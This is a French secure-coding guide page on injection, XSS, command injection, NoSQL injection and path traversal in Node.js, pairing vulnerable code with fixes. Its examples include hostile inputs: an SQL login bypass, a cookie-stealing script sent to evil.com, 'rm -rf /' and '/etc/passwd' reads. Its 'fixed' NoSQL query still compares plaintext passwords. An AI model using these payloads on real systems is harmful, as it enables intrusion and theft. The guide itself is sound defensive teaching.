---
id: injections-xss
parent: securite
label: Injections & XSS
explored: false
order: 1
---

# Injections & XSS

Les injections (SQL, commande, NoSQL) et le Cross-Site Scripting (XSS) sont les deux familles de vulnérabilités les plus exploitées. Elles partagent la même cause : ne pas faire confiance aux données utilisateur.

## Injection SQL

```javascript
// ❌ Vulnérable — concaténation directe
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
// email = "admin'--" → SELECT * WHERE email = 'admin'--' AND password = ''
// → authentifie sans mot de passe

// ✅ Paramétrisé — la valeur ne peut jamais être du SQL
// node-postgres (pg)
const { rows } = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);

// Prisma — ORM qui paramétrise automatiquement
const user = await prisma.user.findUnique({ where: { email } });

// Valider les inputs avant même la requête
const emailSchema = z.string().email().max(255);
const validEmail = emailSchema.parse(req.body.email);
```

## XSS — Cross-Site Scripting

```javascript
// ❌ XSS réfléchi — l'input est affiché directement dans le HTML
res.send(`<p>Bonjour ${req.query.name}</p>`);
// URL: /greet?name=<script>fetch('evil.com?c='+document.cookie)</script>

// ✅ Echapper le HTML côté serveur
import { escape } from 'html-escaper';
res.send(`<p>Bonjour ${escape(req.query.name)}</p>`);

// ✅ Les frameworks modernes échappent automatiquement
// React : {userInput} → texte brut, jamais HTML
// Angular : {{ userInput }} → sanitisé automatiquement
// NE PAS utiliser dangerouslySetInnerHTML / innerHTML sans sanitisation

// Si HTML utilisateur est nécessaire — DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href', 'target'],
});
```

## Injection de commandes

```javascript
// ❌ Dangereux — l'input peut contenir ; rm -rf / ou | cat /etc/passwd
import { exec } from 'child_process';
exec(`convert ${userFilename} output.png`);

// ✅ Passer les arguments séparément — jamais via le shell
import { execFile } from 'child_process';
execFile('convert', [userFilename, 'output.png'], (err, stdout) => { ... });

// ✅ Ou utiliser des librairies natives qui évitent le shell
import sharp from 'sharp';  // traitement d'images en Node.js pur
await sharp(userFilename).toFile('output.png');
```

## Injection NoSQL (MongoDB)

```javascript
// ❌ Vulnérable si req.body.email = { $gt: "" } → tous les utilisateurs
await User.findOne({ email: req.body.email, password: req.body.password });

// ✅ Valider le type avant la requête
const email    = z.string().email().parse(req.body.email);
const password = z.string().min(1).parse(req.body.password);
await User.findOne({ email, password });
```

## Path Traversal

```javascript
// ❌ L'utilisateur peut accéder à ../../../etc/passwd
app.get('/files/:name', (req, res) => {
  res.sendFile(path.join(__dirname, 'uploads', req.params.name));
});

// ✅ Vérifier que le chemin résolu est dans le répertoire autorisé
app.get('/files/:name', (req, res) => {
  const safeBase     = path.resolve(__dirname, 'uploads');
  const requestedPath = path.resolve(safeBase, req.params.name);

  if (!requestedPath.startsWith(safeBase + path.sep)) {
    return res.status(403).send('Forbidden');
  }
  res.sendFile(requestedPath);
});
```

## Liens

- [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP — XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
